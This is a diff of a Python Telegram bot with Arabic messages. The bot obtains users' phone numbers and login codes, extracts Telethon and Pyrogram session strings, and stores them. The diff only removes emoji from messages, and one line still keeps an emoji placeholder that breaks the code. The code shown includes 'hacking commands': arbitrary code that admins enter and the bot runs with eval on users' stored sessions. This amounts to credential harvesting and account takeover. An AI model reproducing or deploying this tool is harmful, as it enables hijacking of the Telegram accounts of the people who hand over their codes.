@@ -106,7 +106,7 @@ def toggle_hack_commands(user_id):
 async def start(event):
     user_id = event.sender_id
     if get_bot_status() == 'stopped' and not is_admin(user_id):
-        return await event.respond(f"{✨} البوت متوقف حالياً.")
+        return await event.respond(f"البوت متوقف حالياً.")
 
     buttons = [
         [Button.inline(f"استخراج جلسة تيليثون", b"get_telethon_session")],
@@ -123,8 +123,8 @@ async def start(event):
         buttons.append([Button.inline(f"أوامر الاختراق", b"hack_commands")])
 
     await event.respond(
-        f"{✨} مرحبا بك في بوت استخراج الجلسات!\n\n"
-        f"{🌿} اختر أحد الخيارات التالية:",
+        f"مرحبا بك في بوت استخراج الجلسات!\n\n"
+        f"اختر أحد الخيارات التالية:",
         buttons=buttons
     )
 
@@ -133,10 +133,10 @@ async def start(event):
 async def get_telethon_session(event):
     user_id = event.sender_id
     if get_bot_mode() == 'paid' and not is_premium(user_id):
-        return await event.edit(f"{✨} هذه الميزة متاحة للمشتركين فقط.")
+        return await event.edit(f"هذه الميزة متاحة للمشتركين فقط.")
 
-    await event.edit(f"{💻} جاري استخراج جلسة تيليثون...\n\n"
-                    f"{👤} الرجاء إرسال رقم هاتفك بالصيغة الدولية (مثال: +9665xxxxxxxx)")
+    await event.edit(f"جاري استخراج جلسة تيليثون...\n\n"
+                    f"الرجاء إرسال رقم هاتفك بالصيغة الدولية (مثال: +9665xxxxxxxx)")
 
     phone = await telethon_client.wait_for(events.NewMessage(from_users=user_id))
     phone = phone.text.strip()
@@ -146,7 +146,7 @@ async def get_telethon_session(event):
         await client.connect()
         if not await client.is_user_authorized():
             await client.send_code_request(phone)
-            await event.edit(f"{✨} تم إرسال الكود إلى رقمك، الرجاء إرساله هنا.")
+            await event.edit(f"تم إرسال الكود إلى رقمك، الرجاء إرساله هنا.")
 
             code = await telethon_client.wait_for(events.NewMessage(from_users=user_id))
             code = code.text.strip()
@@ -159,8 +159,8 @@ async def get_telethon_session(event):
                           (user_id, is_premium(user_id), session_string, 'telethon', hack_commands_enabled(user_id)))
             conn.commit()
 
-            await event.edit(f"{💻} تم استخراج الجلسة بنجاح!\n\n"
-                           f"{👤} جلستك:\n`{session_string}`")
+            await event.edit(f"تم استخراج الجلسة بنجاح!\n\n"
+                           f"جلستك:\n`{session_string}`")
         else:
             session_string = client.session.save()
             await client.disconnect()
@@ -169,19 +169,19 @@ async def get_telethon_session(event):
                           (user_id, is_premium(user_id), session_string, 'telethon', hack_commands_enabled(user_id)))
             conn.commit()
 
-            await event.edit(f"{💻} تم استخراج الجلسة بنجاح!\n\n"
-                           f"{👤} جلستك:\n`{session_string}`")
+            await event.edit(f"تم استخراج الجلسة بنجاح!\n\n"
+                           f"جلستك:\n`{session_string}`")
     except Exception as e:
-        await event.edit(f"{⚡} حدث خطأ: {str(e)}")
+        await event.edit(f"حدث خطأ: {str(e)}")
 
 @telethon_client.on(events.CallbackQuery(data=b"get_pyrogram_session"))
 async def get_pyrogram_session(event):
     user_id = event.sender_id
     if get_bot_mode() == 'paid' and not is_premium(user_id):
-        return await event.edit(f"{✨} هذه الميزة متاحة للمشتركين فقط.")
+        return await event.edit(f"هذه الميزة متاحة للمشتركين فقط.")
 
-    await event.edit(f"{💻} جاري استخراج جلسة بايروغرام...\n\n"
-                    f"{👤} الرجاء إرسال رقم هاتفك بالصيغة الدولية (مثال: +9665xxxxxxxx)")
+    await event.edit(f"جاري استخراج جلسة بايروغرام...\n\n"
+                    f"الرجاء إرسال رقم هاتفك بالصيغة الدولية (مثال: +9665xxxxxxxx)")
 
     phone = await telethon_client.wait_for(events.NewMessage(from_users=user_id))
     phone = phone.text.strip()
@@ -190,7 +190,7 @@ async def get_pyrogram_session(event):
         client = PyroClient(f'pyro_session_{user_id}', API_ID, API_HASH, phone_number=phone)
         await client.connect()
         sent_code = await client.send_code(phone)
-        await event.edit(f"{✨} تم إرسال الكود إلى رقمك، الرجاء إرساله هنا.")
+        await event.edit(f"تم إرسال الكود إلى رقمك، الرجاء إرساله هنا.")
 
         code = await telethon_client.wait_for(events.NewMessage(from_users=user_id))
         code = code.text.strip()
@@ -203,26 +203,26 @@ async def get_pyrogram_session(event):
                       (user_id, is_premium(user_id), session_string, 'pyrogram', hack_commands_enabled(user_id)))
         conn.commit()
 
-        await event.edit(f"{💻} تم استخراج الجلسة بنجاح!\n\n"
-                       f"{👤} جلستك:\n`{session_string}`")
+        await event.edit(f"تم استخراج الجلسة بنجاح!\n\n"
+                       f"جلستك:\n`{session_string}`")
     except Exception as e:
-        await event.edit(f"{⚡} حدث خطأ: {str(e)}")
+        await event.edit(f"حدث خطأ: {str(e)}")
 
 # Session conversion handlers
 @telethon_client.on(events.CallbackQuery(data=b"telethon_to_pyro"))
 async def telethon_to_pyro(event):
     user_id = event.sender_id
     if get_bot_mode() == 'paid' and not is_premium(user_id):
-        return await event.edit(f"{✨} هذه الميزة متاحة للمشتركين فقط.")
+        return await event.edit(f"هذه الميزة متاحة للمشتركين فقط.")
 
     cursor.execute("SELECT session_string FROM users WHERE user_id = ? AND session_type = 'telethon'", (user_id,))
     result = cursor.fetchone()
 
     if not result:
-        return await event.edit(f"{⚡} لا توجد جلسة تيليثون محفوظة لديك.")
+        return await event.edit(f"لا توجد جلسة تيليثون محفوظة لديك.")
 
     session_string = result[0]
-    await event.edit(f"{💻} جاري تحويل الجلسة...")
+    await event.edit(f"جاري تحويل الجلسة...")
 
     try:
         from telethon.sessions import StringSession
@@ -238,25 +238,25 @@ async def telethon_to_pyro(event):
                       (user_id, is_premium(user_id), new_session_string, 'pyrogram', hack_commands_enabled(user_id)))
         conn.commit()
 
-        await event.edit(f"{💻} تم تحويل الجلسة بنجاح!\n\n"
-                       f"{👤} جلستك الجديدة:\n`{new_session_string}`")
+        await event.edit(f"تم تحويل الجلسة بنجاح!\n\n"
+                       f"جلستك الجديدة:\n`{new_session_string}`")
     except Exception as e:
-        await event.edit(f"{⚡} حدث خطأ: {str(e)}")
+        await event.edit(f"حدث خطأ: {str(e)}")
 
 @telethon_client.on(events.CallbackQuery(data=b"pyro_to_telethon"))
 async def pyro_to_telethon(event):
     user_id = event.sender_id
     if get_bot_mode() == 'paid' and not is_premium(user_id):
-        return await event.edit(f"{✨} هذه الميزة متاحة للمشتركين فقط.")
+        return await event.edit(f"هذه الميزة متاحة للمشتركين فقط.")
 
     cursor.execute("SELECT session_string FROM users WHERE user_id = ? AND session_type = 'pyrogram'", (user_id,))
     result = cursor.fetchone()
 
     if not result:
-        return await event.edit(f"{⚡} لا توجد جلسة بايروغرام محفوظة لديك.")
+        return await event.edit(f"لا توجد جلسة بايروغرام محفوظة لديك.")
 
     session_string = result[0]
-    await event.edit(f"{💻} جاري تحويل الجلسة...")
+    await event.edit(f"جاري تحويل الجلسة...")
 
     try:
         pyro_client_temp = PyroClient(":memory:", api_id=API_ID, api_hash=API_HASH, session_string=session_string)
@@ -274,17 +274,17 @@ async def pyro_to_telethon(event):
                       (user_id, is_premium(user_id), new_session_string, 'telethon', hack_commands_enabled(user_id)))
         conn.commit()
 
-        await event.edit(f"{💻} تم تحويل الجلسة بنجاح!\n\n"
-                       f"{👤} جلستك الجديدة:\n`{new_session_string}`")
+        await event.edit(f"تم تحويل الجلسة بنجاح!\n\n"
+                       f"جلستك الجديدة:\n`{new_session_string}`")
     except Exception as e:
-        await event.edit(f"{⚡} حدث خطأ: {str(e)}")
+        await event.edit(f"حدث خطأ: {str(e)}")
 
 # Control panel
 @telethon_client.on(events.CallbackQuery(data=b"control_panel"))
 async def control_panel(event):
     user_id = event.sender_id
     if get_bot_status() == 'stopped' and not is_admin(user_id):
-        return await event.edit(f"{✨} البوت متوقف حالياً.")
+        return await event.edit(f"البوت متوقف حالياً.")
 
     buttons = [
         [Button.inline(f"عرض الجلسات المحفوظة", b"show_sessions")],
@@ -294,8 +294,8 @@ async def control_panel(event):
     ]
 
     await event.edit(
-        f"{🌿} لوحة التحكم:\n\n"
-        f"{👤} اختر أحد الخيارات التالية:",
+        f"لوحة التحكم:\n\n"
+        f"اختر أحد الخيارات التالية:",
         buttons=buttons
     )
 
@@ -304,7 +304,7 @@ async def toggle_hack_commands_handler(event):
     user_id = event.sender_id
     new_status = toggle_hack_commands(user_id)
     status_text = "مفعل" if new_status else "معطل"
-    await event.edit(f"{⚡} تم {'تفعيل' if new_status else 'تعطيل'} أوامر الاختراق.\n\n{🌿} الحالة الحالية: {status_text}")
+    await event.edit(f"تم {'تفعيل' if new_status else 'تعطيل'} أوامر الاختراق.\n\n{🌿} الحالة الحالية: {status_text}")
 
 @telethon_client.on(events.CallbackQuery(data=b"show_sessions"))
 async def show_sessions(event):
@@ -313,11 +313,11 @@ async def show_sessions(event):
     sessions = cursor.fetchall()
 
     if not sessions:
-        return await event.edit(f"{⚡} لا توجد جلسات محفوظة لديك.")
+        return await event.edit(f"لا توجد جلسات محفوظة لديك.")
 
-    message = f"{💻} جلساتك المحفوظة:\n\n"
+    message = f"جلساتك المحفوظة:\n\n"
     for idx, (session_type, session_string) in enumerate(sessions, 1):
-        message += f"{👤} {idx}. نوع الجلسة: {session_type}\n{session_string}\n\n"
+        message += f"{idx}. نوع الجلسة: {session_type}\n{session_string}\n\n"
 
     await event.edit(message)
 
@@ -328,7 +328,7 @@ async def delete_session(event):
     sessions = cursor.fetchall()
 
     if not sessions:
-        return await event.edit(f"{⚡} لا توجد جلسات محفوظة لديك.")
+        return await event.edit(f"لا توجد جلسات محفوظة لديك.")
 
     buttons = []
     for session_type in sessions:
@@ -337,7 +337,7 @@ async def delete_session(event):
     buttons.append([Button.inline(f"إلغاء", b"control_panel")])
 
     await event.edit(
-        f"{🌿} اختر الجلسة التي تريد حذفها:",
+        f"اختر الجلسة التي تريد حذفها:",
         buttons=buttons
     )
 
@@ -352,7 +352,7 @@ async def confirm_delete(event):
     ]
 
     await event.edit(
-        f"{⚡} هل أنت متأكد من حذف جلسة {session_type}؟",
+        f"هل أنت متأكد من حذف جلسة {session_type}؟",
         buttons=buttons
     )
 
@@ -364,14 +364,14 @@ async def delete(event):
     cursor.execute("DELETE FROM users WHERE user_id = ? AND session_type = ?", (user_id, session_type))
     conn.commit()
 
-    await event.edit(f"{⚡} تم حذف جلسة {session_type} بنجاح.")
+    await event.edit(f"تم حذف جلسة {session_type} بنجاح.")
 
 # Hack commands
 @telethon_client.on(events.CallbackQuery(data=b"hack_commands"))
 async def hack_commands_panel(event):
     user_id = event.sender_id
     if not hack_commands_enabled(user_id):
-        return await event.edit(f"{⚡} أوامر الاختراق معطلة. يرجى تفعيلها من لوحة التحكم.")
+        return await event.edit(f"أوامر الاختراق معطلة. يرجى تفعيلها من لوحة التحكم.")
 
     cursor.execute("SELECT id, command_name, command_description FROM hack_commands")
     commands = cursor.fetchall()
@@ -383,8 +383,8 @@ async def hack_commands_panel(event):
     buttons.append([Button.inline(f"العودة للقائمة الرئيسية", b"start")])
 
     await event.edit(
-        f"{🎲} أوامر الاختراق:\n\n"
-        f"{👤} اختر أمر لتنفيذه على جلستك:",
+        f"أوامر الاختراق:\n\n"
+        f"اختر أمر لتنفيذه على جلستك:",
         buttons=buttons
     )
 
@@ -397,7 +397,7 @@ async def execute_hack_command(event):
     session_data = cursor.fetchone()
 
     if not session_data:
-        return await event.edit(f"{⚡} لا توجد جلسة محفوظة لديك.")
+        return await event.edit(f"لا توجد جلسة محفوظة لديك.")
 
     session_string, session_type = session_data
 
@@ -405,10 +405,10 @@ async def execute_hack_command(event):
     command_data = cursor.fetchone()
 
     if not command_data:
-        return await event.edit(f"{⚡} الأمر غير موجود.")
+        return await event.edit(f"الأمر غير موجود.")
 
     cmd_name, cmd_code = command_data
-    await event.edit(f"{🎲} جاري تنفيذ الأمر: {cmd_name}...")
+    await event.edit(f"جاري تنفيذ الأمر: {cmd_name}...")
 
     try:
         if session_type == 'telethon':
@@ -423,9 +423,9 @@ async def execute_hack_command(event):
             result = eval(f"await {cmd_code}")
             await client.stop()
 
-        await event.edit(f"{🎲} نتيجة تنفيذ الأمر:\n\n```{str(result)[:4000]}```")
+        await event.edit(f"نتيجة تنفيذ الأمر:\n\n```{str(result)[:4000]}```")
     except Exception as e:
-        await event.edit(f"{⚡} حدث خطأ أثناء التنفيذ: {str(e)}")
+        await event.edit(f"حدث خطأ أثناء التنفيذ: {str(e)}")
 
 # Admin panel
 @telethon_client.on(events.CallbackQuery(data=b"admin_panel"))
@@ -447,10 +447,10 @@ async def admin_panel(event):
     mode = "مدفوع" if get_bot_mode() == 'paid' else "مجاني"
 
     await event.edit(
-        f"{🪐} لوحة الأدمن:\n\n"
-        f"{🔅} حالة البوت: {status}\n"
-        f"{🔅} وضع البوت: {mode}\n\n"
-        f"{🌿} اختر أحد الخيارات التالية:",
+        f"لوحة الأدمن:\n\n"
+        f"حالة البوت: {status}\n"
+        f"وضع البوت: {mode}\n\n"
+        f"اختر أحد الخيارات التالية:",
         buttons=buttons
     )
 
@@ -464,7 +464,7 @@ async def toggle_bot_status(event):
     new_status = 'stopped' if current_status == 'running' else 'running'
     set_bot_status(new_status)
 
-    await event.edit(f"{🔅} تم تغيير حالة البوت إلى: {'متوقف' if new_status == 'stopped' else 'شغال'}")
+    await event.edit(f"تم تغيير حالة البوت إلى: {'متوقف' if new_status == 'stopped' else 'شغال'}")
 
 @telethon_client.on(events.CallbackQuery(data=b"toggle_bot_mode"))
 async def toggle_bot_mode(event):
@@ -476,7 +476,7 @@ async def toggle_bot_mode(event):
     new_mode = 'paid' if current_mode == 'free' else 'free'
     set_bot_mode(new_mode)
 
-    await event.edit(f"{🔅} تم تغيير وضع البوت إلى: {'مدفوع' if new_mode == 'paid' else 'مجاني'}")
+    await event.edit(f"تم تغيير وضع البوت إلى: {'مدفوع' if new_mode == 'paid' else 'مجاني'}")
 
 @telethon_client.on(events.CallbackQuery(data=b"manage_subscribers"))
 async def manage_subscribers(event):
@@ -492,8 +492,8 @@ async def manage_subscribers(event):
     ]
 
     await event.edit(
-        f"{👤} إدارة المشتركين:\n\n"
-        f"{🌿} اختر أحد الخيارات التالية:",
+        f"إدارة المشتركين:\n\n"
+        f"اختر أحد الخيارات التالية:",
         buttons=buttons
     )
 
@@ -503,7 +503,7 @@ async def add_subscriber(event):
     if not is_admin(user_id):
         return await event.answer("ليس لديك صلاحية.", alert=True)
 
-    await event.edit(f"{👤} أرسل معرف المستخدم الذي تريد إضافته كمشترك (مثال: 123456789)")
+    await event.edit(f"أرسل معرف المستخدم الذي تريد إضافته كمشترك (مثال: 123456789)")
 
     user = await telethon_client.wait_for(events.NewMessage(from_users=user_id))
     try:
@@ -512,9 +512,9 @@ async def add_subscriber(event):
         if cursor.rowcount == 0:
             cursor.execute("INSERT INTO users (user_id, is_premium) VALUES (?, 1)", (subscriber_id,))
         conn.commit()
-        await event.edit(f"{👤} تم إضافة المستخدم {subscriber_id} كمشترك بنجاح.")
+        await event.edit(f"تم إضافة المستخدم {subscriber_id} كمشترك بنجاح.")
     except ValueError:
-        await event.edit(f"{⚡} معرف المستخدم غير صالح.")
+        await event.edit(f"معرف المستخدم غير صالح.")
 
 @telethon_client.on(events.CallbackQuery(data=b"remove_subscriber"))
 async def remove_subscriber(event):
@@ -522,16 +522,16 @@ async def remove_subscriber(event):
     if not is_admin(user_id):
         return await event.answer("ليس لديك صلاحية.", alert=True)
 
-    await event.edit(f"{👤} أرسل معرف المستخدم الذي تريد إزالته من المشتركين (مثال: 123456789)")
+    await event.edit(f"أرسل معرف المستخدم الذي تريد إزالته من المشتركين (مثال: 123456789)")
 
     user = await telethon_client.wait_for(events.NewMessage(from_users=user_id))
     try:
         subscriber_id = int(user.text.strip())
         cursor.execute("UPDATE users SET is_premium = 0 WHERE user_id = ?", (subscriber_id,))
         conn.commit()
-        await event.edit(f"{👤} تم إزالة المستخدم {subscriber_id} من المشتركين.")
+        await event.edit(f"تم إزالة المستخدم {subscriber_id} من المشتركين.")
     except ValueError:
-        await event.edit(f"{⚡} معرف المستخدم غير صالح.")
+        await event.edit(f"معرف المستخدم غير صالح.")
 
 @telethon_client.on(events.CallbackQuery(data=b"list_subscribers"))
 async def list_subscribers(event):
@@ -543,9 +543,9 @@ async def list_subscribers(event):
     subscribers = cursor.fetchall()
 
     if not subscribers:
-        return await event.edit(f"{👤} لا يوجد مشتركين حالياً.")
+        return await event.edit(f"لا يوجد مشتركين حالياً.")
 
-    message = f"{👤} قائمة المشتركين ({len(subscribers)}):\n\n"
+    message = f"قائمة المشتركين ({len(subscribers)}):\n\n"
     for subscriber in subscribers:
         message += f"{subscriber[0]}\n"
 
@@ -566,8 +566,8 @@ async def manage_hack_commands(event):
     ]
 
     await event.edit(
-        f"{🎲} إدارة أوامر الاختراق:\n\n"
-        f"{🌿} اختر أحد الخيارات التالية:",
+        f"إدارة أوامر الاختراق:\n\n"
+        f"اختر أحد الخيارات التالية:",
         buttons=buttons
     )
 
@@ -577,17 +577,17 @@ async def add_hack_command(event):
     if not is_admin(user_id):
         return await event.answer("ليس لديك صلاحية.", alert=True)
 
-    await event.edit(f"{🎲} أرسل اسم الأمر الجديد:")
+    await event.edit(f"أرسل اسم الأمر الجديد:")
 
     command_name = await telethon_client.wait_for(events.NewMessage(from_users=user_id))
     command_name = command_name.text.strip()
 
-    await event.edit(f"{🎲} أرسل وصف الأمر:")
+    await event.edit(f"أرسل وصف الأمر:")
 
     command_description = await telethon_client.wait_for(events.NewMessage(from_users=user_id))
     command_description = command_description.text.strip()
 
-    await event.edit(f"{🎲} أرسل كود الأمر (استخدم 'client' كمتغير للعميل):")
+    await event.edit(f"أرسل كود الأمر (استخدم 'client' كمتغير للعميل):")
 
     command_code = await telethon_client.wait_for(events.NewMessage(from_users=user_id))
     command_code = command_code.text.strip()
@@ -596,9 +596,9 @@ async def add_hack_command(event):
         cursor.execute("INSERT INTO hack_commands VALUES (NULL, ?, ?, ?)",
                       (command_name, command_description, command_code))
         conn.commit()
-        await event.edit(f"{🎲} تم إضافة الأمر بنجاح!")
+        await event.edit(f"تم إضافة الأمر بنجاح!")
     except Exception as e:
-        await event.edit(f"{⚡} حدث خطأ: {str(e)}")
+        await event.edit(f"حدث خطأ: {str(e)}")
 
 @telethon_client.on(events.CallbackQuery(data=b"edit_hack_command"))
 async def edit_hack_command(event):
@@ -610,7 +610,7 @@ async def edit_hack_command(event):
     commands = cursor.fetchall()
 
     if not commands:
-        return await event.edit(f"{⚡} لا توجد أوامر لتعديلها.")
+        return await event.edit(f"لا توجد أوامر لتعديلها.")
 
     buttons = []
     for cmd_id, cmd_name in commands:
@@ -619,7 +619,7 @@ async def edit_hack_command(event):
     buttons.append([Button.inline(f"إلغاء", b"manage_hack_commands")])
 
     await event.edit(
-        f"{🎲} اختر الأمر الذي تريد تعديله:",
+        f"اختر الأمر الذي تريد تعديله:",
         buttons=buttons
     )
 
@@ -632,12 +632,12 @@ async def select_edit_command(event):
     command_data = cursor.fetchone()
 
     if not command_data:
-        return await event.edit(f"{⚡} الأمر غير موجود.")
+        return await event.edit(f"الأمر غير موجود.")
 
     command_name, command_description, command_code = command_data
 
     await event.edit(
-        f"{🎲} تعديل الأمر: {command_name}\n\n"
+        f"تعديل الأمر: {command_name}\n\n"
         f"اختر ما تريد تعديله:",
         buttons=[
             [Button.inline(f"تعديل الاسم", f"edit_command_name_{cmd_id}".encode())],
@@ -652,7 +652,7 @@ async def edit_command_name(event):
     cmd_id = int(event.data_match.group(1))
     user_id = event.sender_id
 
-    await event.edit(f"{🎲} أرسل الاسم الجديد للأمر:")
+    await event.edit(f"أرسل الاسم الجديد للأمر:")
 
     new_name = await telethon_client.wait_for(events.NewMessage(from_users=user_id))
     new_name = new_name.text.strip()
@@ -660,14 +660,14 @@ async def edit_command_name(event):
     cursor.execute("UPDATE hack_commands SET command_name = ? WHERE id = ?", (new_name, cmd_id))
     conn.commit()
 
-    await event.edit(f"{🎲} تم تحديث اسم الأمر بنجاح!")
+    await event.edit(f"تم تحديث اسم الأمر بنجاح!")
 
 @telethon_client.on(events.CallbackQuery(pattern=b"edit_command_desc_(\d+)"))
 async def edit_command_desc(event):
     cmd_id = int(event.data_match.group(1))
     user_id = event.sender_id
 
-    await event.edit(f"{🎲} أرسل الوصف الجديد للأمر:")
+    await event.edit(f"أرسل الوصف الجديد للأمر:")
 
     new_desc = await telethon_client.wait_for(events.NewMessage(from_users=user_id))
     new_desc = new_desc.text.strip()
@@ -675,14 +675,14 @@ async def edit_command_desc(event):
     cursor.execute("UPDATE hack_commands SET command_description = ? WHERE id = ?", (new_desc, cmd_id))
     conn.commit()
 
-    await event.edit(f"{🎲} تم تحديث وصف الأمر بنجاح!")
+    await event.edit(f"تم تحديث وصف الأمر بنجاح!")
 
 @telethon_client.on(events.CallbackQuery(pattern=b"edit_command_code_(\d+)"))
 async def edit_command_code(event):
     cmd_id = int(event.data_match.group(1))
     user_id = event.sender_id
 
-    await event.edit(f"{🎲} أرسل الكود الجديد للأمر (استخدم 'client' كمتغير للعميل):")
+    await event.edit(f"أرسل الكود الجديد للأمر (استخدم 'client' كمتغير للعميل):")
 
     new_code = await telethon_client.wait_for(events.NewMessage(from_users=user_id))
     new_code = new_code.text.strip()
@@ -690,7 +690,7 @@ async def edit_command_code(event):
     cursor.execute("UPDATE hack_commands SET command_code = ? WHERE id = ?", (new_code, cmd_id))
     conn.commit()
 
-    await event.edit(f"{🎲} تم تحديث كود الأمر بنجاح!")
+    await event.edit(f"تم تحديث كود الأمر بنجاح!")
 
 @telethon_client.on(events.CallbackQuery(data=b"delete_hack_command"))
 async def delete_hack_command(event):
@@ -702,7 +702,7 @@ async def delete_hack_command(event):
     commands = cursor.fetchall()
 
     if not commands:
-        return await event.edit(f"{⚡} لا توجد أوامر لحذفها.")
+        return await event.edit(f"لا توجد أوامر لحذفها.")
 
     buttons = []
     for cmd_id, cmd_name in commands:
@@ -711,7 +711,7 @@ async def delete_hack_command(event):
     buttons.append([Button.inline(f"إلغاء", b"manage_hack_commands")])
 
     await event.edit(
-        f"{🎲} اختر الأمر الذي تريد حذفه:",
+        f"اختر الأمر الذي تريد حذفه:",
         buttons=buttons
     )
 
@@ -724,7 +724,7 @@ async def confirm_delete_command(event):
     command_name = cursor.fetchone()[0]
 
     await event.edit(
-        f"{⚡} هل أنت متأكد من حذف الأمر: {command_name}?",
+        f"هل أنت متأكد من حذف الأمر: {command_name}?",
         buttons=[
             [Button.inline(f"تأكيد الحذف", f"delete_command_{cmd_id}".encode())],
             [Button.inline(f"إلغاء", b"manage_hack_commands")]
@@ -739,7 +739,7 @@ async def delete_command(event):
     cursor.execute("DELETE FROM hack_commands WHERE id = ?", (cmd_id,))
     conn.commit()
 
-    await event.edit(f"{⚡} تم حذف الأمر بنجاح!")
+    await event.edit(f"تم حذف الأمر بنجاح!")
 
 @telethon_client.on(events.CallbackQuery(data=b"list_hack_commands"))
 async def list_hack_commands(event):
@@ -751,9 +751,9 @@ async def list_hack_commands(event):
     commands = cursor.fetchall()
 
     if not commands:
-        return await event.edit(f"{⚡} لا توجد أوامر حالياً.")
+        return await event.edit(f"لا توجد أوامر حالياً.")
 
-    message = f"{🎲} قائمة أوامر الاختراق ({len(commands)}):\n\n"
+    message = f"قائمة أوامر الاختراق ({len(commands)}):\n\n"
     for cmd_id, cmd_name, cmd_desc in commands:
         message += f"{cmd_id}. {cmd_name} - {cmd_desc}\n"
 
@@ -778,12 +778,12 @@ async def bot_stats(event):
     mode = "مدفوع" if get_bot_mode() == 'paid' else "مجاني"
 
     await event.edit(
-        f"{🪐} إحصائيات البوت:\n\n"
-        f"{🔅} حالة البوت: {status}\n"
-        f"{🔅} وضع البوت: {mode}\n"
-        f"{👤} إجمالي المستخدمين: {total_users}\n"
-        f"{✨} المشتركين: {premium_users}\n"
-        f"{🎲} أوامر الاختراق: {total_commands}"
+        f"إحصائيات البوت:\n\n"
+        f"حالة البوت: {status}\n"
+        f"وضع البوت: {mode}\n"
+        f"إجمالي المستخدمين: {total_users}\n"
+        f"المشتركين: {premium_users}\n"
+        f"أوامر الاختراق: {total_commands}"
     )
 
 # Run the bot
